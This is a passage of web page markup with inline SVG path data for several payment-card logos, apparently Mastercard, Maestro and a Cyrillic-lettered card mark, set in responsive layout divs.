                d="M57.7485 35.8619C57.7156 35.8087 57.6862 35.7713 57.6646 35.7486C57.651 35.7361 57.6363 35.7259 57.6159 35.7191C57.6646 35.7157 57.7043 35.6976 57.7338 35.667C57.7621 35.6375 57.7791 35.599 57.7791 35.5582C57.7791 35.5299 57.77 35.5004 57.7519 35.4744C57.7338 35.4494 57.71 35.4302 57.6816 35.4189C57.6533 35.4075 57.6035 35.4019 57.5366 35.4019H57.3372V35.973H57.4301V35.7305H57.4833C57.5162 35.7305 57.5423 35.7373 57.5581 35.7497C57.5819 35.7701 57.6136 35.8132 57.6556 35.8846L57.7043 35.9741H57.8187L57.7485 35.8619ZM57.5445 35.6523H57.4323V35.4789H57.5366C57.5819 35.4789 57.6114 35.4823 57.6295 35.488C57.6442 35.4959 57.6578 35.5038 57.6669 35.5186C57.6771 35.5333 57.6816 35.5458 57.6816 35.565C57.6816 35.59 57.6714 35.6115 57.6544 35.6273C57.6329 35.6466 57.5978 35.6523 57.5445 35.6523Z"
                fill="currentColor"
              ></path>
              <path
                d="M51.3462 29.3315C50.5632 29.3315 49.9819 30.4001 49.9819 30.4001L50.1383 29.4177H48.5088L47.4176 36.1961H49.2125C49.7236 33.2998 49.8165 30.9508 51.0301 31.3803C51.2442 30.2607 51.4505 29.8267 51.6828 29.3542C51.6828 29.3553 51.574 29.3315 51.3462 29.3315Z"
                fill="currentColor"
              ></path>
              <path
                d="M55.8561 27.8652L55.4788 30.2052C55.4788 30.2052 54.8216 29.2952 53.7904 29.2952C52.187 29.2964 50.8522 31.2284 50.8522 33.4471C50.8522 34.8805 51.5649 36.2845 53.0199 36.2845C54.068 36.2845 54.6482 35.5536 54.6482 35.5536L54.5723 36.178H56.2731L57.6102 27.8618L55.8561 27.8652ZM53.6386 34.5848C53.0085 34.5848 52.7139 34.0567 52.7139 33.2273C52.7139 31.8709 53.3224 30.9768 54.0918 30.9768C54.7196 30.978 55.0425 31.4097 55.0425 32.4273C55.0425 33.3508 54.5859 34.5848 53.6386 34.5848Z"
                fill="currentColor"
              ></path>
              <path
                d="M62.3524 11H1.64759C0.736544 11 0 11.7377 0 12.6476V50.8289C0 51.7388 0.736544 52.4765 1.64759 52.4765H62.3524C63.2635 52.4765 64 51.7388 64 50.8289V12.6476C64 11.7377 63.2635 11 62.3524 11ZM58.2538 41.1179C58.2062 41.204 58.1416 41.2697 58.0578 41.3162C57.9739 41.3626 57.8856 41.3864 57.7949 41.3864C57.702 41.3864 57.6136 41.3626 57.5297 41.3162C57.447 41.2697 57.3813 41.204 57.3326 41.1179C57.2861 41.0351 57.2623 40.9467 57.2623 40.855C57.2623 40.7632 57.2861 40.6759 57.3337 40.5898C57.3802 40.5037 57.4482 40.4391 57.532 40.3926C57.617 40.3484 57.7031 40.3246 57.7938 40.3246C57.8833 40.3246 57.9694 40.3484 58.0533 40.3926C58.1382 40.4391 58.2051 40.5037 58.2516 40.5898C58.2992 40.6759 58.3218 40.7643 58.3218 40.855C58.3218 40.9456 58.3014 41.0374 58.2538 41.1179ZM59.4414 31.7388C59.4436 40.8096 52.0941 48.166 43.0221 48.1683C38.7796 48.1694 34.911 46.5615 31.9966 43.9201C29.0822 46.5569 25.2215 48.1637 20.9858 48.1637C11.9195 48.1637 4.56091 40.8062 4.56091 31.7388C4.56091 22.7076 11.8618 15.3717 20.8805 15.3127C20.9156 15.3127 20.9507 15.3127 20.9858 15.3127C25.2215 15.3127 29.0833 16.9195 31.9977 19.5564C34.911 16.9184 38.7751 15.3105 43.0142 15.3093C52.0861 15.3059 59.4414 22.6589 59.4436 31.7309C59.4414 31.7331 59.4414 31.7343 59.4414 31.7388Z"
                fill="currentColor"
              ></path>
              <path
                d="M30.3151 42.3862C30.8352 43.0231 31.3859 43.6304 31.9944 44.1811C32.008 44.1687 32.0227 44.1573 32.0363 44.146C32.0363 44.146 32.0352 44.146 32.0352 44.1449H32.0386C32.6369 43.5998 33.1955 43.0129 33.7066 42.3862H30.3151Z"
                fill="currentColor"
              ></path>
              <path
                d="M32.5519 33.3711C32.5519 33.3711 32.7819 32.2379 32.7819 31.7767C32.7819 30.6243 32.2086 29.2192 30.289 29.2192C28.5304 29.2204 27.2284 31.115 27.2284 33.2566C27.2284 35.728 28.859 36.315 30.2494 36.315C31.5321 36.315 32.0964 36.0272 32.0964 36.0272L32.4046 34.3411C32.4046 34.3411 31.429 34.7716 30.5474 34.7716C28.6698 34.7716 28.9984 33.3711 28.9984 33.3711H32.5519ZM30.2947 30.7886C31.2817 30.7886 31.0992 31.898 31.0992 31.9864H29.1581C29.1581 31.8719 29.3417 30.7886 30.2947 30.7886Z"
                fill="currentColor"
              ></path>
              <path
                d="M40.7536 29.4517C41.6431 29.4517 42.3581 29.9514 42.3581 29.9514L42.6437 28.0987C42.6437 28.0987 41.5853 27.6704 40.6743 27.6704C38.6561 27.6704 36.6924 29.4223 36.6924 32.7118C36.6924 34.8931 37.7519 36.3333 39.8391 36.3333C40.4284 36.3333 41.3689 36.0942 41.3689 36.0942L41.6816 34.186C41.6816 34.186 40.825 34.6155 40.2357 34.6155C38.9938 34.6143 38.4963 33.667 38.4963 32.6517C38.4963 30.586 39.5638 29.4517 40.7536 29.4517Z"
                fill="currentColor"
              ></path>
              <path
                d="M28.1224 38.936C28.4069 39.5468 28.7377 40.1281 29.0924 40.6947H34.9202C35.2737 40.1304 35.5921 39.5434 35.8765 38.936H28.1224Z"
                fill="currentColor"
              ></path>
              <path
                d="M36.6607 29.3337C35.8777 29.3337 35.2975 30.4022 35.2975 30.4022L35.455 29.4198H33.8267L32.7355 36.1982H34.5304C35.0392 33.3031 35.1343 30.9529 36.3479 31.3824C36.561 30.2617 36.7661 29.8277 36.9984 29.3541C36.9984 29.3541 36.8896 29.3314 36.6607 29.3337Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
                d="M35.8459 24.9995H28.3592C27.881 25.9049 27.5638 26.5893 27.4742 26.7593H36.5553C36.3502 26.1542 36.1145 25.5684 35.8459 24.9995Z"
                fill="currentColor"
              ></path>
              <path
                d="M24.5643 29.3589C23.8448 29.3589 23.2181 29.4507 22.2436 29.6977L21.9887 31.147L22.1507 31.1051L22.4295 31.0348C22.8465 30.9238 23.4731 30.8569 24.0306 30.8569C24.9348 30.8569 25.2838 31.0155 25.2838 31.4405C25.2838 31.5583 25.2601 31.6467 25.2136 31.8586C24.9122 31.8269 24.6334 31.8087 24.4249 31.8087C22.2674 31.8087 21.0142 32.7255 21.0142 34.2892C21.0142 35.3294 21.7337 36.0467 22.7785 36.0467C23.6601 36.0467 24.3343 35.7985 24.8204 35.2694L24.7739 35.9357H26.3977L26.4204 35.7612L26.4442 35.5402L26.4906 35.2138L26.5598 34.8059L26.9779 32.5192C27.0946 31.8031 27.1173 31.5617 27.1173 31.2444C27.1173 30.0138 26.2357 29.3589 24.5643 29.3589ZM23.5909 34.6824C23.1501 34.6824 22.8952 34.424 22.8952 34.0263C22.8952 33.3759 23.4527 33.0473 24.5428 33.0473C24.6822 33.0473 24.7751 33.0507 24.9847 33.0722C24.9371 34.024 24.3796 34.6824 23.5909 34.6824Z"
                fill="currentColor"
              ></path>
              <path
                d="M18.4623 28.0249L16.3037 32.9258L16.1643 28.0249H13.1241L11.6147 35.9388H13.3779L14.5383 29.8923L14.8635 35.9388H16.6278L19.2963 29.8538L18.136 35.9388H20.085L21.617 28.0249H18.4623Z"
                fill="currentColor"
              ></path>
              <path
                d="M53.9015 35.3464C53.9003 35.3034 53.8777 35.2592 53.855 35.2354C53.8085 35.2127 53.7621 35.2104 53.7394 35.2104H53.5536V35.6546H53.6465V35.4813H53.7156L53.7859 35.6546H53.9015L53.8323 35.462C53.8788 35.4427 53.9015 35.3952 53.9015 35.3464ZM53.7621 35.3963C53.7394 35.4054 53.7156 35.4054 53.7156 35.4054H53.6454V35.2898H53.6941C53.7168 35.2898 53.7632 35.2898 53.7632 35.3C53.787 35.309 53.787 35.3272 53.787 35.3442C53.787 35.3634 53.7847 35.3861 53.7621 35.3963Z"
                fill="currentColor"
              ></path>
              <path
                d="M57.9762 41.0051C57.9739 40.9609 57.9524 40.9167 57.9286 40.8941C57.8822 40.8714 57.8357 40.8691 57.8119 40.8691H57.6272V41.3133H57.7201V41.1388H57.7892L57.8595 41.3133H57.9762L57.906 41.1196C57.9524 41.1026 57.9762 41.055 57.9762 41.0051ZM57.8357 41.055C57.8119 41.064 57.7892 41.064 57.7892 41.064H57.719V40.9496H57.7654C57.7892 40.9496 57.8357 40.9496 57.8357 40.9587C57.8595 40.9677 57.8595 40.987 57.8595 41.0029C57.8595 41.0232 57.8595 41.0436 57.8357 41.055Z"
                fill="currentColor"
              ></path>
              <path
                d="M62.3524 11.2622H1.64759C0.736544 11.2622 0 11.9999 0 12.9098V51.0911C0 52.001 0.736544 52.7387 1.64759 52.7387H62.3524C63.2635 52.7387 64 52.001 64 51.0911V12.9098C64 11.9999 63.2635 11.2622 62.3524 11.2622ZM58.2538 41.3801C58.2062 41.4662 58.1416 41.5319 58.0578 41.5784C57.9739 41.6248 57.8856 41.6486 57.7949 41.6486C57.702 41.6486 57.6136 41.6248 57.5297 41.5784C57.447 41.5319 57.3813 41.4662 57.3326 41.3801C57.2861 41.2973 57.2623 41.209 57.2623 41.1172C57.2623 41.0254 57.2861 40.9381 57.3337 40.852C57.3802 40.7659 57.4482 40.7013 57.532 40.6548C57.617 40.6106 57.7031 40.5869 57.7938 40.5869C57.8833 40.5869 57.9694 40.6106 58.0533 40.6548C58.1382 40.7013 58.2051 40.7659 58.2516 40.852C58.2992 40.9381 58.3218 41.0265 58.3218 41.1172C58.3218 41.2078 58.3014 41.2996 58.2538 41.3801ZM59.4414 32.001C59.4436 41.0718 52.0941 48.4282 43.0221 48.4305C38.7796 48.4316 34.911 46.8237 31.9966 44.1823C29.0822 46.8191 25.2215 48.4259 20.9858 48.4259C11.9195 48.4259 4.56091 41.0684 4.56091 32.001C4.56091 22.9699 11.8618 15.6339 20.8805 15.575C20.9156 15.575 20.9507 15.575 20.9858 15.575C25.2215 15.575 29.0833 17.1818 31.9977 19.8186C34.911 17.1806 38.7751 15.5727 43.0142 15.5716C52.0861 15.5682 59.4414 22.9211 59.4436 31.9931C59.4414 31.9953 59.4414 31.9965 59.4414 32.001Z"
                fill="currentColor"
              ></path>
              <path
                d="M33.6237 21.5151H30.5031C30.0838 22.0817 29.6895 22.6845 29.3325 23.2738H34.8997C34.5133 22.6596 34.0861 22.0726 33.6237 21.5151Z"
                fill="currentColor"
              ></path>
              <path
                d="M37.0753 30.8781C37.4708 30.8781 37.9807 30.9121 38.4918 30.9722L38.7705 29.4843C38.2595 29.4141 37.4935 29.3574 37.0289 29.3574C34.8487 29.3574 34.0804 30.3478 34.0816 31.5319C34.0816 32.3433 34.5462 32.9042 35.5898 33.3257C36.3773 33.6464 36.4952 33.7416 36.4952 34.0362C36.4952 34.435 36.1484 34.6163 35.3824 34.6163C34.7773 34.6163 34.2447 34.537 33.617 34.3625L33.3394 35.8469L33.4323 35.8639L33.7801 35.9274C33.8957 35.9501 34.0816 35.9693 34.3139 35.9852C34.7773 36.0192 35.1241 36.0384 35.3801 36.0384C37.4697 36.0384 38.4215 35.3597 38.4215 33.8923C38.4215 33.0084 38.0272 32.4928 37.0289 32.1008C36.2164 31.7756 36.1235 31.7019 36.1235 31.4005C36.1235 31.0549 36.4476 30.8781 37.0753 30.8781Z"
                fill="currentColor"
              ></path>
              <path
                d="M47.2442 29.488C47.1501 29.4653 47.0799 29.4529 47.0799 29.4495C47.0107 29.4393 46.9405 29.4336 46.8702 29.4336C46.2425 29.4336 45.779 29.7191 45.1762 30.4795L45.362 29.5027H43.5977L42.4136 35.939H44.3637C45.0606 32.0036 45.3609 31.3123 46.2889 31.3123C46.3592 31.3123 46.4283 31.318 46.5212 31.3282L46.7535 31.3758L47.4527 29.5582C47.2906 29.4959 47.2668 29.4959 47.2442 29.488Z"
                fill="currentColor"
              ></path>
              <path
                d="M41.3915 31.0676H42.3898L42.6685 29.5015H41.6714L41.9501 28.0239H40.0238L39.1184 32.9372L39.0255 33.446L38.9088 34.0794C38.885 34.2834 38.8623 34.476 38.8623 34.6562C38.8623 35.5695 39.396 36.0704 40.3943 36.0704C40.8351 36.0704 41.2532 36.0069 41.7869 35.8608L42.0419 34.433C41.9048 34.4749 41.7416 34.4953 41.532 34.4953C41.0685 34.4953 40.8578 34.3525 40.8578 34.0194C40.8578 33.9605 40.8578 33.871 40.8816 33.7531L41.3915 31.0676Z"
                fill="currentColor"
              ></path>
              <path
                d="M53.7156 34.9326C53.4369 34.9326 53.2046 35.1581 53.2046 35.4335C53.2046 35.7122 53.4369 35.9377 53.7156 35.9377C53.9944 35.9377 54.2267 35.7122 54.2267 35.4335C54.2267 35.1592 53.9944 34.9326 53.7156 34.9326ZM53.7156 35.8176C53.5071 35.8176 53.3213 35.6465 53.3213 35.4335C53.3213 35.2227 53.5071 35.0527 53.7156 35.0527C53.9264 35.0527 54.0873 35.2227 54.0873 35.4335C54.0873 35.6465 53.9264 35.8176 53.7156 35.8176Z"
                fill="currentColor"
              ></path>
              <path
                d="M50.4668 29.3188C48.1462 29.3188 46.6379 30.8656 46.6379 33.1443C46.6379 34.7772 47.5184 36.112 49.7258 36.112C51.7201 36.112 53.2056 35.1613 53.5082 33.022C53.5547 32.648 53.5547 32.622 53.5547 32.2231C53.5547 30.5891 52.4872 29.3188 50.4668 29.3188ZM51.4187 32.9664C51.2566 33.9693 50.3524 34.5438 49.9343 34.5438C49.2374 34.5574 48.8204 33.9693 48.8204 33.0956C48.8204 32.0622 49.4232 30.8894 50.4215 30.8894C51.2102 30.8894 51.4878 31.5273 51.4878 32.1982C51.4878 32.4769 51.4651 32.7307 51.4187 32.9664Z"
                fill="currentColor"
              ></path>
              <path
                d="M33.243 33.2703C33.4074 32.6176 33.4776 32.1552 33.4776 31.6793C33.4776 30.2527 32.4555 29.3428 30.8555 29.3428C28.9054 29.3428 27.4674 30.9688 27.4674 33.1751C27.4663 35.0731 28.604 36.0601 30.7853 36.0601C31.4583 36.0601 32.1076 35.9751 32.7581 35.8006L33.0821 34.1892C32.3864 34.4725 31.7598 34.5983 31.0629 34.5983C29.949 34.5983 29.3688 34.2187 29.3688 33.4731C29.3688 33.413 29.3688 33.3688 29.3926 33.2703H33.243ZM30.8317 30.8159C31.4119 30.8159 31.7371 31.1207 31.7371 31.6431C31.7371 31.7292 31.7371 31.8357 31.7371 31.9739L29.5785 31.9717C29.7643 31.2238 30.2062 30.8159 30.8317 30.8159Z"
                fill="currentColor"
              ></path>
              <path
                d="M28.1224 38.937C28.4069 39.5466 28.7389 40.1279 29.0924 40.6957H34.9202C35.2737 40.1302 35.5933 39.5444 35.8765 38.937H28.1224Z"
                fill="currentColor"
              ></path>
              <path
                d="M30.3151 42.3828C30.8352 43.0208 31.3859 43.6293 31.9944 44.1777C32.008 44.1652 32.0227 44.1551 32.0363 44.1415H32.0386C32.6369 43.5964 33.1955 43.0094 33.7066 42.3828H30.3151Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
                d="M6.72746 23.8584C6.7082 23.9037 6.6844 23.9491 6.66967 23.9966C6.49177 24.5949 6.62888 25.1423 7.11047 25.6148C7.53086 26.0272 8.1065 25.8913 8.65834 25.8969C8.65834 24.8975 8.65834 23.9275 8.65834 22.9428C7.55806 22.8046 7.08554 23.0346 6.72746 23.8584Z"
                fill="currentColor"
              ></path>
              <path
                d="M7.10142 33.2417C7.10256 33.4468 7.10482 33.6315 7.10256 33.8173C7.09349 35.0219 7.09576 36.2298 6.75468 37.4071C6.58584 37.9941 6.30596 38.5584 6.07593 39.1306C6.93145 39.1306 7.8425 39.1306 8.76148 39.1306C8.76148 37.1442 8.76148 35.1884 8.76148 33.2417C8.19717 33.2417 7.6578 33.2417 7.10142 33.2417Z"
                fill="currentColor"
              ></path>
              <path
                d="M15.5536 33.4797C15.3915 33.2055 15.1525 32.9936 14.7491 32.9755C14.3366 32.9551 14.0907 33.1681 13.906 33.4276C13.472 34.0384 13.3451 34.7171 13.2771 35.4401C14.1949 35.4401 15.0663 35.4401 15.9683 35.4401C15.9717 34.7545 15.9128 34.0939 15.5536 33.4797Z"
                fill="currentColor"
              ></path>
              <path
                d="M28.9484 37.0685C28.7648 36.1836 28.0544 35.8289 26.9903 36.0544C26.9122 36.0714 26.8034 36.1722 26.8034 36.2346C26.7898 37.1751 26.7943 38.1178 26.7943 39.0731C27.8572 39.3258 28.7388 38.9167 28.9416 38.0578C29.0164 37.7394 29.0141 37.3881 28.9484 37.0685Z"
                fill="currentColor"
              ></path>
              <path
                d="M62.3524 11.2622H1.64759C0.736544 11.2622 0 11.9999 0 12.9098V51.09C0 51.9999 0.736544 52.7387 1.64759 52.7387H62.3524C63.2635 52.7387 64 52.001 64 51.0911V12.9098C64 11.9999 63.2635 11.2622 62.3524 11.2622ZM26.1144 26.6084C26.1677 26.0407 26.3331 25.5002 26.7524 25.0333C27.2975 24.4282 28.2969 24.3138 29.0266 24.7931C28.928 24.9177 28.8374 25.0322 28.749 25.1421C28.7173 25.1466 28.698 25.1546 28.681 25.15C27.7972 24.9109 27.2657 25.1251 26.9983 25.8492C26.8011 26.3784 26.7592 26.9245 26.8737 27.4673C27.0912 28.5143 27.9195 28.8769 29.1229 28.4758C29.234 28.9631 29.1705 29.0231 28.6028 29.1557C27.7994 29.3449 27.0164 29.0639 26.5666 28.4656C26.136 27.8934 26.0555 27.2599 26.1144 26.6084ZM6.55071 22.7976C6.92125 22.4701 7.37224 22.3002 7.91615 22.3024C8.30142 22.3036 8.68555 22.3024 9.07195 22.3024C9.49122 22.3036 9.49235 22.3024 9.49235 22.639C9.49235 24.6639 9.49235 26.6888 9.49235 28.7126C9.49235 28.835 9.49235 28.9551 9.49235 29.0979C9.2204 29.0979 8.96997 29.0979 8.68102 29.0979C8.68102 28.2673 8.68102 27.4356 8.68102 26.6106C8.20283 26.5189 8.1779 26.5279 7.97507 26.8407C7.53541 27.5228 7.08555 28.2005 6.66176 28.8883C6.55071 29.0662 6.4272 29.1432 6.18697 29.1217C6.00567 29.1058 5.81983 29.1183 5.57847 29.1183C6.1711 28.2254 6.73654 27.3733 7.30538 26.5189C5.61246 26.0622 5.27819 23.9228 6.55071 22.7976ZM11.0448 41.6985C10.6504 41.6985 10.2697 41.6985 9.85496 41.6985C9.85496 41.1421 9.85496 40.5948 9.85496 40.0293C8.36487 40.0293 6.90652 40.0293 5.4187 40.0293C5.4187 40.5767 5.4187 41.124 5.4187 41.6917C4.99717 41.6917 4.60737 41.6917 4.19377 41.6917C4.19377 40.8543 4.19377 40.0157 4.19377 39.1727C4.22323 39.1648 4.25269 39.1444 4.27649 39.1489C4.72974 39.2237 4.90765 39.0152 5.05609 38.7002C5.50482 37.7404 5.72918 36.7444 5.8119 35.7291C5.90482 34.5857 5.93201 33.4378 5.98867 32.2718C7.31898 32.2718 8.68329 32.2718 10.0918 32.2718C10.0918 34.5676 10.0918 36.8429 10.0918 39.141C10.4147 39.141 10.7173 39.141 11.0448 39.141C11.0448 40.0044 11.0448 40.8452 11.0448 41.6985ZM11.5003 29.1126C11.2442 29.1126 11.0232 29.1126 10.7785 29.1126C10.7785 27.6429 10.7785 26.1767 10.7785 24.6843C11.0153 24.6843 11.2306 24.6843 11.4788 24.6843C11.4788 25.2803 11.4788 25.8707 11.4788 26.4792C11.9377 26.4792 12.3626 26.4792 12.8181 26.4792C12.8181 25.8832 12.8181 25.2928 12.8181 24.69C13.072 24.69 13.2929 24.69 13.5354 24.69C13.5354 26.1642 13.5354 27.6316 13.5354 29.1149C13.2986 29.1149 13.0776 29.1149 12.8227 29.1149C12.8227 28.452 12.8227 27.7982 12.8227 27.1296C12.3728 27.1296 11.9535 27.1296 11.5003 27.1296C11.5003 27.788 11.5003 28.4407 11.5003 29.1126ZM13.5014 39.967C12.885 39.6645 12.5144 39.1931 12.2958 38.6514C11.5683 36.8588 11.6499 35.082 12.5994 33.3563C12.9235 32.7682 13.4051 32.2718 14.1949 32.0577C14.9552 31.8514 15.5649 31.9999 16.0714 32.5098C16.6436 33.0877 16.9201 33.7767 17.0595 34.4939C17.1694 35.0673 17.1751 35.6577 17.2295 36.2639C15.9025 36.2639 14.6278 36.2639 13.3133 36.2639C13.3246 36.9937 13.3144 37.6826 13.5785 38.3512C13.9207 39.2214 14.7048 39.5523 15.9048 39.3075C16.2754 39.2316 16.6244 39.0934 17.013 38.9755C17.0878 39.1546 17.1717 39.3631 17.2544 39.5659C16.2074 40.3002 14.536 40.4747 13.5014 39.967ZM18.1235 29.9398C17.9309 29.9398 17.7303 29.9398 17.4924 29.9398C17.4924 29.6497 17.4924 29.3529 17.4924 29.039C16.6436 29.039 15.8323 29.039 14.9847 29.039C14.9847 29.3359 14.9847 29.6327 14.9847 29.9444C14.7467 29.9444 14.5439 29.9444 14.3173 29.9444C14.3173 29.4888 14.3173 29.031 14.3173 28.5506C14.6765 28.5982 14.7456 28.3704 14.8385 28.1574C15.2147 27.2939 15.2476 26.3908 15.2861 25.4888C15.2975 25.2293 15.2873 24.971 15.2873 24.6832C16.0771 24.6832 16.8238 24.6832 17.6023 24.6832C17.6023 25.9648 17.6023 27.2361 17.6023 28.5245C17.7881 28.5313 17.9422 28.5381 18.1235 28.5449C18.1235 29.0016 18.1235 29.4616 18.1235 29.9398ZM19.1026 25.3631C19.2249 25.1478 19.3994 24.9359 19.6068 24.7704C20.1586 24.3274 20.8533 24.4135 21.2544 24.9529C21.711 25.567 21.7994 26.2424 21.7518 26.9631C21.021 26.9631 20.3048 26.9631 19.5592 26.9631C19.5433 27.4446 19.5309 27.9047 19.7904 28.333C20.0113 28.699 20.4261 28.8282 21.0074 28.7104C21.2159 28.6684 21.4153 28.5959 21.6227 28.5359C21.8584 28.7874 21.8493 28.8951 21.5082 29.014C21.2023 29.1206 20.8771 29.2123 20.5518 29.2463C19.8788 29.3177 19.2986 29.0299 19.0448 28.4667C18.8714 28.0837 18.7592 27.6701 18.7082 27.2633C18.6266 26.6084 18.7569 25.9648 19.1026 25.3631ZM23.6272 40.0905C23.2045 40.0905 22.7966 40.0905 22.3558 40.0905C22.3558 38.9177 22.3558 37.7506 22.3558 36.5495C21.7552 36.5495 21.1864 36.5495 20.6176 36.5495C20.017 36.5495 20.017 36.5472 20.017 37.0503C20.0159 37.9614 20.017 38.8724 20.017 39.7835C20.017 39.8798 20.017 39.9772 20.017 40.0905C19.5819 40.0905 19.1751 40.0905 18.7501 40.0905C18.7501 37.4832 18.7501 34.8837 18.7501 32.2696C19.1626 32.2696 19.5615 32.2696 20.0011 32.2696C20.0011 33.3381 20.0011 34.3897 20.0011 35.4673C20.8125 35.4673 21.5603 35.4673 22.3467 35.4673C22.3467 34.3999 22.3467 33.3381 22.3467 32.265C22.7456 32.265 23.1093 32.2582 23.4708 32.273C23.5297 32.2752 23.5898 32.3625 23.6374 32.418C23.6567 32.4407 23.6408 32.4815 23.6408 32.5143C23.6408 34.9631 23.6408 37.4106 23.6419 39.8605C23.6419 39.9308 23.6329 40.0044 23.6272 40.0905ZM25.1105 29.0095C25.0334 29.0005 24.9518 28.9041 24.9043 28.8316C24.5394 28.2922 24.1824 27.7495 23.821 27.2067C23.77 27.1296 23.7122 27.056 23.5773 26.9733C23.532 27.1455 23.4527 27.3177 23.4459 27.49C23.4278 27.992 23.4391 28.4939 23.4391 29.0072C23.1887 29.0072 22.9745 29.0072 22.7365 29.0072C22.7365 27.5761 22.7365 26.1415 22.7365 24.6843C22.97 24.6843 23.183 24.6843 23.4289 24.6843C23.4289 25.3019 23.4289 25.907 23.4289 26.588C23.5377 26.4826 23.5943 26.4361 23.6397 26.3829C24.0385 25.9081 24.4521 25.4412 24.8249 24.9517C24.9949 24.7296 25.1841 24.6288 25.4935 24.6707C25.5705 24.6809 25.6499 24.6718 25.787 24.6718C25.7144 24.767 25.6691 24.8316 25.617 24.8951C25.1921 25.405 24.7739 25.9183 24.3365 26.4203C24.2187 26.5551 24.2255 26.6537 24.3173 26.7897C24.8023 27.516 25.2759 28.2446 25.7836 29.0186C25.5286 29.0186 25.3167 29.0356 25.1105 29.0095ZM30.4997 38.5585C30.0873 39.5013 29.2068 39.9614 28.0521 40.0452C27.2816 40.103 26.5009 40.0565 25.6929 40.0565C25.6929 37.4072 25.6929 34.8463 25.6929 32.2696C26.051 32.2696 26.4 32.2696 26.7853 32.2696C26.7853 33.2033 26.7853 34.1438 26.7853 35.0718C27.328 35.0718 27.8402 35.0401 28.3433 35.0786C29.6204 35.1818 30.4204 35.822 30.6323 36.8747C30.7456 37.4469 30.7411 38.0157 30.4997 38.5585ZM36.4884 33.0503C35.3235 33.0503 34.1552 33.0503 32.962 33.0503C32.962 35.4129 32.962 37.7438 32.962 40.0894C32.5666 40.0894 32.196 40.0894 31.8028 40.0894C31.8028 37.4866 31.8028 34.8826 31.8028 32.2616C33.379 32.2616 34.9246 32.2616 36.4907 32.2616C36.4907 32.5234 36.4907 32.7716 36.4884 33.0503ZM40.7467 40.0905C40.7467 38.3806 40.7467 36.6707 40.7467 34.9495C39.949 36.6775 39.1581 38.3886 38.3705 40.0973C37.9399 40.0973 37.5467 40.0973 37.1263 40.0973C37.1263 37.4877 37.1263 34.8849 37.1263 32.265C37.5467 32.265 37.9547 32.265 38.3943 32.265C38.3943 33.8832 38.3943 35.4877 38.3943 37.0911C38.4147 37.0945 38.4329 37.0979 38.4544 37.1013C38.6754 36.6288 38.9008 36.1585 39.1195 35.686C39.6181 34.6073 40.1201 33.5319 40.6142 32.452C40.6833 32.2968 40.7751 32.239 40.979 32.2469C41.3711 32.2639 41.7654 32.2526 42.1745 32.2526C42.1745 34.8781 42.1745 37.4775 42.1756 40.0905C41.7043 40.0905 41.2431 40.0905 40.7467 40.0905ZM59.4674 39.9398C59.1955 40.1631 58.8612 40.239 58.4986 40.239C56.8272 40.2412 55.1592 40.239 53.4901 40.239C51.8108 40.239 50.1314 40.2412 48.4533 40.239C47.6125 40.2367 47.0051 39.856 46.7705 39.192C46.7399 39.1013 46.7297 39.0005 46.7297 38.9041C46.7275 36.9506 46.7331 34.9982 46.7252 33.0446C46.7218 32.3557 47.1127 31.873 47.8142 31.5376C50.196 30.4033 52.5779 29.269 54.9586 28.1325C55.3484 27.9466 55.745 27.8186 56.1938 27.9795C56.5836 28.1211 56.7513 28.3942 56.7535 28.7217C56.7603 30.7897 56.7807 32.8577 56.7422 34.9234C56.7297 35.5614 56.3207 36.069 55.5626 36.3228C53.881 36.8871 52.196 37.4401 50.5133 37.9988C50.0929 38.1381 49.6714 38.2741 49.2533 38.4214C49.1207 38.469 48.987 38.5359 48.8839 38.6186C48.8057 38.6854 48.706 38.8225 48.7377 38.8781C48.7887 38.9597 48.9439 39.0469 49.0561 39.0469C49.3167 39.048 49.5864 39.0197 49.8402 38.9642C52.1077 38.4724 54.3717 37.9682 56.638 37.4684C57.3666 37.3064 57.9751 36.6684 57.9773 36.0452C57.9841 34.8565 57.9887 33.6679 57.9728 32.4803C57.9705 32.2367 58.051 32.1359 58.3558 32.1676C58.5133 32.1846 58.6708 32.1676 58.8295 32.1699C59.3496 32.1767 59.7054 32.4316 59.7813 32.8565C59.8028 32.9744 59.8051 33.1013 59.8051 33.2214C59.8074 35.1262 59.8074 37.0288 59.8062 38.9347C59.8062 39.2939 59.8221 39.6543 59.4674 39.9398Z"
                fill="currentColor"
              ></path>
              <path
                d="M53.9139 31.4615C53.3519 31.5329 52.9847 31.8083 52.8148 32.2457C52.6301 32.7182 52.927 33.0933 53.4595 33.0955C54.0964 33.0967 54.7434 32.4972 54.6629 31.9794C54.6097 31.6451 54.2856 31.4151 53.9139 31.4615Z"
                fill="currentColor"
              ></path>
              <path
                d="M15.9456 25.2271C15.8968 26.35 15.9886 27.4763 15.3121 28.5222C15.847 28.5222 16.3433 28.5222 16.8713 28.5222C16.8713 27.4118 16.8713 26.3251 16.8713 25.2271C16.5541 25.2271 16.2549 25.2271 15.9456 25.2271Z"
                fill="currentColor"
              ></path>
              <path
                d="M20.7955 25.3124C20.5768 24.9917 20.1678 24.9815 19.9219 25.2886C19.6386 25.6433 19.5559 26.0444 19.5332 26.4773C20.042 26.4773 20.5292 26.4773 21.0607 26.4773C21.0697 26.0626 21.0403 25.6694 20.7955 25.3124Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-1/12 sm:flex sm:justify-end sm:w-1/3 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
